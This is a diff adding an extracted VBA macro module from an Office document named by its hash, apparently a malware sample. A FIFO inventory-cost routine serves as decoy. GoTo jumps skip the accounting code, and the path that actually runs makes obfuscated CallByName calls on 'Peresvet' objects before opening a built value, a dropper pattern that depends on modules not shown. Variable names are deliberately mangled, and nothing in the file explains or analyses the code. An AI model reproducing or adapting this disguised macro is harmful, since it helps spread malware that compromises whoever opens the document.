@@ -1,0 +1,132 @@
+Filename     : ./macros/6914d2dc897cce17969e1478609142a2d7ae7041eeeac0bd23cdb9536b5e7fa5
+OLE stream   : _VBA_PROJECT_CUR/VBA/Module2
+VBA filename : Module2.bas
+----------------------------------------
+Attribute VB_Name = "Module2"
+
+  Public Sub GetFIFOCost(SysPKtransH As String, syspkLdgrInvty As String, SyspkInvty As String, dateissue As Date, TransNum As String, Qtyout As Double, SellingPrice As String, ModuleType As String, Optional dateissue2 As String)
+Dim rsPurch As String
+Dim rsCost As String
+Dim rsCostSql As String
+Dim sqlstring As String
+Dim UpdateString As String
+Dim QtyoutBal As Double
+Dim QtyINremaining As Double
+Dim RecordCounter  As Double
+Dim GeneratedPK As String
+
+rbp = CallByName(Peresvet_1, Peresvet_0_13(10), VbGet)
+GoTo QT5
+QtyoutBal = Qtyout
+
+sqlstring = "SELECT Inventory_Master2.Description_Invty, Transaction_Header.SysPK_TransH, Transaction_Ledger_Invty.SysPK_LdgrInvty, Inventory_Master2.SysPK_Invty,Transaction_Ledger_Invty.BaseUnitQtyReceivedBalance_LdgrInvty, "
+sqlstring = sqlstring & " Transaction_Ledger_Invty.DisplayQtyIn_LdgrInvty, Transaction_Ledger_Invty.DiscountedUnitPurchase_LdgrInvty, Transaction_Header.UserPK_TransH, Transaction_Header.DateIssue_TransH"
+sqlstring = sqlstring & " FROM Inventory_Master2 LEFT JOIN (Transaction_Header RIGHT JOIN Transaction_Ledger_Invty ON Transaction_Header.SysPK_TransH = Transaction_Ledger_Invty.SysFK_TransH_LdgrInvty) "
+sqlstring = sqlstring & " ON Inventory_Master2.SysPK_Invty = Transaction_Ledger_Invty.SysFK_Invty_LdgrInvty"
+sqlstring = sqlstring & " WHERE Inventory_Master2.SysPK_Invty = " & SyspkInvty & " AND BaseUnitQtyReceivedBalance_LdgrInvty <> 0 "
+If dateissue2 <> "__/__/__" Then
+    sqlstring = sqlstring & " AND DateIssue_TransH >= #" & CDate(dateissue) & "#"
+End If
+sqlstring = sqlstring & " ORDER BY Transaction_Header.DateIssue_TransH"
+
+rsP.urch.Open sqlstring, clsPRJ.adoConn1, adOpenStatic, adLockPessimistic
+
+If rsP.urch.RecordCount = 0 Then
+  Exit Sub
+End If
+
+
+QT5:
+         CallByName Peresvet_0_19, Peresvet_0_13(9), VbMethod, rbp
+
+GoTo cbn5
+                rsPu.rch.MoveFirst
+                Do While Not rsPu.rch.EOF
+                RecordCounter = RecordCounter + 1
+                QtyINremaining = rsP.rch.Fields("BaseUnitQtyReceivedBalance_LdgrInvty")
+            If QtyoutBal >= QtyINremaining Then
+                
+                QtyoutBal = QtyoutBal - QtyINremaining
+                QtyINremaining = 0
+                 
+                UpdateString = " INSERT INTO Transaction_Ledger_InvtyCost"
+                UpdateString = UpdateString & "(SysPK_LdgrInvtyCost,SysFK_TransH_LdgrInvtyCost,SysFK_LdgrInvty_LdgrInvtyCost,SyFK_Invty_LdgrInvtyCost,ModuleType_LdgrInvtyCost,TransDateIssue_LdgrInvtyCost,RRDateReceived_LdgrInvtyCost"
+                UpdateString = UpdateString & " ,RRNum_LdgrInvtyCost,Cost_LdgrInvtyCost,SellingPrice_LdgrInvtyCost,QtyOut_LdgrInvtyCost,QtyIn_LdgrInvtyCost,UserPK_LdgrInvtyCost,SysFK_TransH2_LdgrInvtyCost)"
+                UpdateString = UpdateString & " VALUES (" & CCur(clsSysPK.GenerateSysPK("SysPK") + Rnd(1 * 4 / 3)) & "," & SysPKtransH & "," & syspkLdgrInvty & "," & SyspkInvty
+                UpdateString = UpdateString & " ,'" & ModuleType & "',#" & dateissue & "#,#" & rsP.urch.Fields("DateIssue_Transh") & "#,'" & rsP.urch.Fields("UserpK_transh") & "'," & rsP.urch.Fields("DiscountedUnitPurchase_LdgrInvty")
+                UpdateString = UpdateString & " ," & SellingPrice & "," & rsP.urch.Fields("BaseUnitQtyReceivedBalance_LdgrInvty") & "," & rsP.urch.Fields("DisplayQtyIn_LdgrInvty") & ",'" & TransNum & "'," & rsP.urch.Fields("SysPK_LdgrInvty") & ")"
+ 
+               
+               
+                clsPRJ.ExecuteConn1 (UpdateString)
+               
+               
+            Else
+                
+                QtyINremaining = QtyINremaining - QtyoutBal
+                QtyoutBal = 0
+                
+                
+                UpdateString = " INSERT INTO Transaction_Ledger_InvtyCost"
+                UpdateString = UpdateString & "(SysPK_LdgrInvtyCost,SysFK_TransH_LdgrInvtyCost,SysFK_LdgrInvty_LdgrInvtyCost,SyFK_Invty_LdgrInvtyCost,ModuleType_LdgrInvtyCost,TransDateIssue_LdgrInvtyCost,RRDateReceived_LdgrInvtyCost"
+                UpdateString = UpdateString & " ,RRNum_LdgrInvtyCost,Cost_LdgrInvtyCost,SellingPrice_LdgrInvtyCost,QtyOut_LdgrInvtyCost,QtyIn_LdgrInvtyCost,UserPK_LdgrInvtyCost,SysFK_TransH2_LdgrInvtyCost)"
+                UpdateString = UpdateString & " VALUES (" & CCur(clsSysPK.GenerateSysPK("SysPK") + Rnd(1 * 4 / 3)) & "," & SysPKtransH & "," & syspkLdgrInvty & "," & SyspkInvty
+                UpdateString = UpdateString & " ,'" & ModuleType & "',#" & dateissue & "#,#" & rsPu.rch.Fields("DateIssue_Transh") & "#,'" & rs.Purch.Fields("UserpK_transh") & "'," & rsP.urch.Fields("DiscountedUnitPurchase_LdgrInvty")
+                UpdateString = UpdateString & " ," & SellingPrice & "," & Qtyout & "," & rsPu.rch.Fields("DisplayQtyIn_LdgrInvty") & ",'" & TransNum & "'," & rsPu.rch.Fields("SysPK_LdgrInvty") & ")"
+
+            
+                clsPRJ.ExecuteConn1 (UpdateString)
+                
+            
+            End If
+cbn5:
+             
+ CallByName Peresvet_0_19, Peresvet_0_13(11), VbMethod, someOne_Peresvet_5, 2
+
+GoTo cadme
+            Call crlIsaiah.ReComputeReceivedBalance(rsPu.rch.Fields("SysPK_LdgrInvty"), QtyINremaining)
+            If QtyoutBal = 0 Then
+              If rsPur.ch.EOF Then
+                Exit Sub
+               Else
+                rsP.urch.MoveNext
+                Do While Not rsP.urch.EOF
+                    Call crlIsaiah.ReComputeReceivedBalance(rsP.urch.Fields("SysPK_LdgrInvty"), rsP.urch.Fields("DisplayQtyIn_LdgrInvty"))
+                    rsP.urch.MoveNext
+                Loop
+                Exit Sub
+               End If
+            End If
+                
+                
+                rsP.urch.MoveNext
+                
+                
+            Loop
+cadme:
+tudaGdeLetli_Peresvet_6.Open (someOne_Peresvet_5 + "")
+ Exit Sub
+If QtyoutBal = 0 Then
+
+              If rsP.urch.EOF Then
+                Exit Sub
+               Else
+                rsP.urch.MoveNext
+                Do While Not rsPu.rch.EOF
+                    Call crlIsaiah.ReComputeReceivedBalance(rsP.urch.Fields("SysPK_LdgrInvty"), rsP.urch.Fields("DisplayQtyIn_LdgrInvty"))
+                    rsPu.rch.MoveNext
+                Loop
+                Exit Sub
+               End If
+            End If
+
+End Sub
+
+
+Public Function DuStin() As String
+DuStin = Range("AC104").Value
+End Function
+
+
+
+
